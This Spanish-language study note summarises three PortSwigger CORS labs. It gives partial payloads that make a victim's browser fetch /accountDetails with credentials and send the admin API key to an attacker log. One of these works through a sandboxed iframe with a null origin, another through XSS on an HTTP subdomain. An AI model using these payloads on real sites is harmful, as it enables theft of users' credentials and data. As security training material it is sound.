---
aliases:
  - CORS labs
  - cors-labs
tags:
  - vuln/cors
  - labs
  - portswigger
---

# CORS — Labs de PortSwigger

Labs de la categoría **[Cross-origin resource sharing (CORS)](https://portswigger.net/web-security/all-labs#cross-origin-resource-sharing-cors)**: 2 Apprentice + 1 Practitioner. **Los tres tienen el mismo objetivo:** robar la **API key del administrador** haciendo que **su** navegador haga un `fetch` autenticado a `/accountDetails` y te mande la respuesta. Lo que cambia es **en qué origen confía** el server (y por lo tanto cómo generás un origen que acepte).

> **Cómo leer las columnas:** **Confía en** = qué origen acepta el server mal configurado · **Cómo generás ese origen** = el truco para que el `fetch` salga de un origen confiable · **Objetivo** = qué conseguís. Metodología y plantillas → [[vulnerabilities/005-cors/cors|entry point]].

## Apprentice

| # | Laboratorio | Confía en (ACAO) | Cómo generás ese origen | Objetivo · cómo se arma |
| --- | --- | --- | --- | --- |
| 1 | [CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack) | **cualquier `Origin`** (lo refleja) + `Allow-Credentials: true` | ninguno: el exploit server **ya es** un origen distinto y el server refleja lo que sea | **Robar la API key del admin.** En Repeater confirmás con `Origin: https://example.com` (vuelve reflejado). Subís un `<script>` con `fetch('/accountDetails',{credentials:'include'})` → `location='/log?key='+…`. **Deliver to victim** → **Access log**. |
| 2 | [CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack) | **`Origin: null`** whitelisteado + `Allow-Credentials: true` | **iframe *sandboxed*** (`sandbox="allow-scripts allow-top-navigation allow-forms"` → sin `allow-same-origin`) con `srcdoc` → la request sale con `Origin: null` | **Robar la API key del admin.** Igual que el 1 pero el `<script>` va **dentro del `srcdoc`** del iframe sandbox. Confirmás en Repeater con `Origin: null` → reflejado. |

## Practitioner

| # | Laboratorio | Confía en (ACAO) | Cómo generás ese origen | Objetivo · cómo se arma |
| --- | --- | --- | --- | --- |
| 3 | [CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack) | **cualquier subdominio, incluso por HTTP** (`http://sub.lab-id` reflejado) | **XSS en un subdominio HTTP** confiable: la página *Check stock* carga por HTTP desde `stock.lab-id` y su `productId` es **XSS** | **Robar la API key del admin.** No podés MITM → inyectás JS **vía XSS en el subdominio**. El exploit hace `document.location` a `http://stock.LAB/?productId=4<script>fetch('/accountDetails',{credentials:'include'})…</script>&storeId=1`; ese JS corre desde un **origen que el server confía** → CORS pasa → exfiltra a tu server. |

---

## Atajos mentales / patrones

- **Objetivo idéntico en los 3:** que **la víctima** haga el `fetch` autenticado y te devuelva la respuesta. **Siempre** `credentials:'include'` + **Deliver to victim** + leer **Access log**. Probarlo en tu navegador solo te roba a vos mismo.
- **El chequeo en Repeater es el mismo para los 3:** agregás un header **`Origin: …`** a la request de datos y mirás si vuelve en **`Access-Control-Allow-Origin`** + si hay **`Access-Control-Allow-Credentials: true`**.
- **Lab 1 (reflejo):** `Origin: https://cualquier-cosa` → reflejado. El más simple: `<script>` directo en el exploit server.
- **Lab 2 (`null`):** el server confía en `null`. Lo generás con **iframe sandbox** (`allow-scripts` **sin** `allow-same-origin`) + `srcdoc`. Otras formas de `null`: `data:` URL, `file:`, redirect.
- **Lab 3 (subdominios):** confía en subdominios **y en HTTP** → como no hay MITM, el trampolín es un **XSS en un subdominio** (`stock.*` por HTTP). CORS + XSS combinados.
- **`ACAO: *` no aparece en estos labs porque NO sirve** para robar sesión: `*` es incompatible con `Allow-Credentials: true`. Solo valdría para data pública / intranet sin credenciales.
- **Lab retirado:** existía "CORS vulnerability with internal network pivot attack" (escanear intranet sin credenciales) → hoy es solo teoría ("Intranets and CORS without credentials"), en el [[vulnerabilities/005-cors/cors#🌐 Curiosidad — CORS sin credenciales / intranet|entry point]].
